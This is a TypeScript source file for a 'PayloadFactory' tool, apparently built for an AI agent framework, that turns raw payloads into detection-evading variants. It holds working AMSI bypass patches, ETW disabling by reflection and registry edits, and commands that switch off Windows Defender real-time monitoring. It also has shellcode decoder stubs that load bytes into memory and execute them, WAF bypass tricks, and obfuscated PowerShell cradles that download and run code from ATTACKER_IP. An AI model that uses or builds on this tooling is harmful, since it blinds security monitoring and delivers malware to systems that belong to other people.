/**
 * PayloadFactoryTool — generate evasion-aware payload variants
 *
 * Transforms raw exploit payloads into bypass-ready versions using
 * encoding, obfuscation, and WAF/EDR evasion techniques.
 * All output is text (command strings), not binary.
 */

import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// ── AMSI bypass templates ──────────────────────────────────────────────────

const AMSI_BYPASS_TEMPLATES: Record<string, string> = {
  reflection: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  string_split: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiU'+[char]116+'ils')
$f=$a.GetField(('am'+[char]115+'iInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)`,
  env_var: `$env:COMPLUS_ETWEnabled=0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', 0, 'Process')`,
  ngen: `# 使用.NET NGEN绕过AMSI扫描
# AMSI不扫描NGEN编译的本机映像
$n = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }
# 然后执行payload`,
}

// ── ETW bypass templates ───────────────────────────────────────────────────

const ETW_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `# ETW EventWrite patch via reflection
$etwAssembly = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwAssembly) {
  $instance = $etwAssembly.GetField('etwProvider','NonPublic,Static').GetValue($null)
  $instance.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($instance,$false)
}`,
  registry: `# Registry-based ETW disable (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v Start /t REG_DWORD /d 0 /f 2>$null`,
}

// ── WAF evasion techniques ─────────────────────────────────────────────────

function wafEvasion(payload: string, wafType?: string): string {
  const lines: string[] = ['[PayloadFactory] WAF Evasion Payloads', '═'.repeat(50), '']

  if (wafType?.includes('宝塔') || wafType?.includes('bt')) {
    lines.push('## 宝塔WAF绕过')
    lines.push(`# 原始payload: ${payload}`)
    lines.push('')
    lines.push('# 方法1: Unicode编码')
    lines.push(`  将payload中的关键字Unicode编码，如: admin → %u0061%u0064%u006d%u0069%u006e`)
    lines.push('')
    lines.push('# 方法2: SQL注释插入')
    lines.push(`  SQL关键字插入注释: ad'min' → OR/**/1=1 → SELECT/**/*/**/FROM`)
    lines.push('')
    lines.push('# 方法3: 分块传输编码')
    lines.push(`  POST /target HTTP/1.1
  Host: TARGET
  Transfer-Encoding: chunked

  5
  ${payload.slice(0, 5)}
  ${payload.length - 5}
  ${payload.slice(5)}`)
    lines.push('')
    lines.push('# 方法4: HTTP参数污染')
    lines.push(`  同一参数多次发送: ?id=1&id=2&id=${encodeURIComponent(payload)}`)
  } else if (wafType?.toLowerCase().includes('cloudflare')) {
    lines.push('## Cloudflare WAF绕过')
    lines.push(`# 原始payload: ${payload}`)
    lines.push('')
    lines.push('# 方法1: 合法User-Agent + Referer')
    lines.push(`  curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://www.google.com" "TARGET"`)
    lines.push('')
    lines.push('# 方法2: JSON body编码（如目标接受JSON）')
    lines.push(`  POST /api HTTP/1.1
  Content-Type: application/json
  {"data": "${Buffer.from(payload).toString('base64')}"}`)
    lines.push('')
    lines.push('# 方法3: Base64编码payload，服务端解码')
    lines.push(`  curl -X POST "TARGET" -d "cmd=${Buffer.from(payload).toString('base64')}"`)
  } else {
    lines.push(`## 通用WAF绕过 (目标: ${wafType || '未知'})`)
    lines.push(`# 原始payload: ${payload}`)
    lines.push('')
    lines.push('# 方法1: 大小写变换')
    lines.push(`  ${payload.replace(/[a-zA-Z]/g, (c) => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase())}`)
    lines.push('')
    lines.push('# 方法2: URL双重编码')
    lines.push(`  ${encodeURIComponent(encodeURIComponent(payload))}`)
    lines.push('')
    lines.push('# 方法3: 分块传输编码')
    const encoded = Buffer.from(payload).toString('hex').match(/.{1,16}/g)?.join('\n  ') ?? payload
    lines.push(`  Transfer-Encoding: chunked
  ${encoded}`)
    lines.push('')
    lines.push('# 方法4: SQL注释插入（SQL注入场景）')
    lines.push(`  SELECT/**/*/**/FROM/**/users → 替代 SELECT * FROM users`)
    lines.push('')
    lines.push('# 方法5: HTTP参数污染')
    lines.push(`  ?id=1&id=2&id=${encodeURIComponent(payload)} → 后端取最后一个`)
  }

  return lines.join('\n')
}

// ── Shellcode encoding ─────────────────────────────────────────────────────

function shellcodeEncode(shellcodeHex: string, encoding: string): string {
  const lines: string[] = ['[PayloadFactory] Shellcode Encoding', '═'.repeat(50), '']

  if (encoding === 'xor' || encoding === 'hex' || encoding === 'base64') {
    // Generate a sample XOR key
    const xorKey = '0xAB'

    if (encoding === 'xor') {
      lines.push(`## XOR 编码 (key: ${xorKey})`)
      lines.push(`# 原始shellcode (hex): ${shellcodeHex.slice(0, 80)}...`)
      lines.push('')
      lines.push('# PowerShell XOR decoder stub:')
      lines.push(`  $encoded = @()
  # XOR encoded bytes (each byte XOR ${xorKey})
  $encoded = 0x00,0x01,0x02,0x03  # ← replace with actual XOR-encoded shellcode
  $decoded = @()
  for ($i = 0; $i -lt $encoded.Length; $i++) {
    $decoded += ($encoded[$i] -bxor ${xorKey})
  }
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decoded.Length)
  for ($i = 0; $i -lt $decoded.Length; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, $i, $decoded[$i])
  }
  $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
  $thread.Invoke()`)
    } else if (encoding === 'base64') {
      lines.push(`## Base64 分段编码`)
      lines.push(`# 将shellcode分成3段分别base64编码，运行时拼接解码`)
      lines.push('')
      lines.push('# PowerShell decoder:')
      lines.push(`  $p1 = "BASE64_PART_1"  # 第一段
  $p2 = "BASE64_PART_2"  # 第二段
  $p3 = "BASE64_PART_3"  # 第三段
  $full = [Convert]::FromBase64String($p1 + $p2 + $p3)
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($full.Length)
  [System.Runtime.InteropServices.Marshal]::Copy($full, 0, $ptr, $full.Length)
  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]]).Invoke()`)
    } else {
      lines.push(`## Hex 编码`)
      lines.push(`# 原始: ${shellcodeHex.slice(0, 80)}...`)
      lines.push(`# 编码: ${shellcodeHex}`)
      lines.push('')
      lines.push('# PowerShell hex decoder:')
      lines.push(`  $hex = "${shellcodeHex}"
  $bytes = [byte[]]::new($hex.Length / 2)
  for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
  }
  # $bytes now contains decoded shellcode`)
    }
  } else {
    lines.push(`## ${encoding} 编码 — 不支持`)
    lines.push('支持的编码: xor, base64, hex')
  }

  return lines.join('\n')
}

// ── Obfuscated PowerShell ──────────────────────────────────────────────────

function obfuscatedPS(script: string): string {
  const lines: string[] = ['[PayloadFactory] Obfuscated PowerShell', '═'.repeat(50), '']

  // Method 1: Base64 encode + IEX
  const base64 = Buffer.from(script, 'utf16le').toString('base64')
  lines.push('## 方法1: Base64编码 + IEX')
  lines.push(`  powershell -nop -w hidden -enc ${base64}`)
  lines.push('')

  // Method 2: String splitting + variable obfuscation
  lines.push('## 方法2: 字符串拆分 + 变量混淆')
  lines.push(`  $a = "IEX"
  $b = "(New-Object Net.WebClient).Downlo"
  $c = "adString('http://ATTACKER_IP/payload.ps1')"
  & $a ($b + $c)`)
  lines.push('')

  // Method 3: Char array reconstruction
  lines.push('## 方法3: Char数组重建（绕过静态字符串检测）')
  lines.push(`  $cmd = -join ([char]73 + [char]69 + [char]88 + [char]32 + [char]39 + "payload")
  iex $cmd`)
  lines.push('')

  // Method 4: Download + execute (no -enc flag)
  lines.push('## 方法4: 无-enc标志下载执行')
  lines.push(`  powershell -nop -c "$s=New-Object Net.WebClient;$s.Headers.Add('User-Agent','Mozilla/5.0');iex $s.DownloadString('http://ATTACKER_IP/p')"`)

  return lines.join('\n')
}

// ── Tool implementation ────────────────────────────────────────────────────

interface PayloadFactoryInput {
  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  bypass_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class PayloadFactoryTool implements Tool {
  name = 'PayloadFactory'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'PayloadFactory',
      description: `生成绕过防护的payload变体。在BypassDetector检测后使用。

## 技术类型
- amsi_bypass: PowerShell AMSI绕过（反射补丁/字符串混淆/环境变量）
- etw_bypass: ETW日志绕过（反射补丁/注册表禁用）
- shellcode_encode: Shellcode编码（XOR/Base64/Hex + decoder stub）
- waf_evasion: WAF绕过（分块编码/参数污染/Unicode/注释插入）
- obfuscated_ps: 混淆PowerShell（base64/IEX/字符串拆分）
- custom: 自定义绕过`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'custom'],
            description: '绕过技术类型',
          },
          payload: { type: 'string', description: '要转换的原始payload/命令/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: '目标平台' },
          bypass_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: '检测到的WAF类型' },
              edr: { type: 'string', description: '检测到的EDR类型' },
              sandbox: { type: 'boolean', description: '是否在沙箱中' },
            },
            description: 'BypassDetector检测结果',
          },
          encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: '编码方式（shellcode_encode时有效）' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', bypass_context, encoding = 'xor' } = input as unknown as PayloadFactoryInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, bypass_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, bypass_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, bypass_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'custom':
        output = `[PayloadFactory] 自定义绕过\n\n原始payload: ${payload}\n平台: ${platform}\n\n请指定具体绕过技术(amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps)`
        break
      default:
        return { content: `未知technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[PayloadFactory] AMSI Bypass Payloads', '═'.repeat(50), '']

    if (edrType?.includes('CrowdStrike')) {
      lines.push(`## CrowdStrike Falcon 环境AMSI绕过`)
      lines.push(`CrowdStrike对PowerShell有额外监控，建议:`)
      lines.push('')
      lines.push('# 方法1: 反射补丁（推荐）')
      lines.push(AMSI_BYPASS_TEMPLATES.string_split)
      lines.push('')
      lines.push('# 方法2: 在payload执行前先绕过AMSI')
      lines.push(`# 步骤1: 执行AMSI绕过`)
      lines.push(AMSI_BYPASS_TEMPLATES.reflection)
      lines.push(`# 步骤2: 执行原始payload`)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push(`## Windows Defender 环境AMSI绕过`)
      lines.push('')
      lines.push('# 方法1: 添加排除路径（需管理员）')
      lines.push(`  Add-MpPreference -ExclusionPath "C:\\temp"`)
      lines.push('')
      lines.push('# 方法2: 禁用实时保护（需管理员）')
      lines.push(`  Set-MpPreference -DisableRealtimeMonitoring $true`)
      lines.push('')
      lines.push('# 方法3: 反射补丁（不需要管理员，推荐）')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection)
      lines.push('')
      lines.push('# 方法4: 字符串混淆（绕过静态检测）')
      lines.push(AMSI_BYPASS_TEMPLATES.string_split)
      lines.push('')
      lines.push('# 然后执行原始payload:')
      lines.push(payload)
    } else {
      // Generic AMSI bypass
      lines.push(`## 通用AMSI绕过 (${edrType || '未知EDR'})`)
      lines.push('')

      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### 方法${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }

      lines.push('## 使用方式')
      lines.push('1. 先执行AMSI绕过（选一个方法）')
      lines.push('2. 再执行原始payload')
      lines.push('')
      lines.push(`原始payload: ${payload}`)
    }

    return lines.join('\n')
  }

  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[PayloadFactory] ETW Bypass Payloads', '═'.repeat(50), '']

    lines.push(`## ETW绕过 (${edrType || '未知EDR'})`)
    lines.push('ETW (Event Tracing for Windows) 被EDR用于监控PowerShell执行。绕过ETW可避免执行被记录。')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### 方法${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push('## 使用方式')
    lines.push('1. 先执行ETW绕过')
    lines.push('2. 再执行原始payload（建议同时做AMSI绕过）')
    lines.push('')
    lines.push(`原始payload: ${payload}`)

    return lines.join('\n')
  }
}
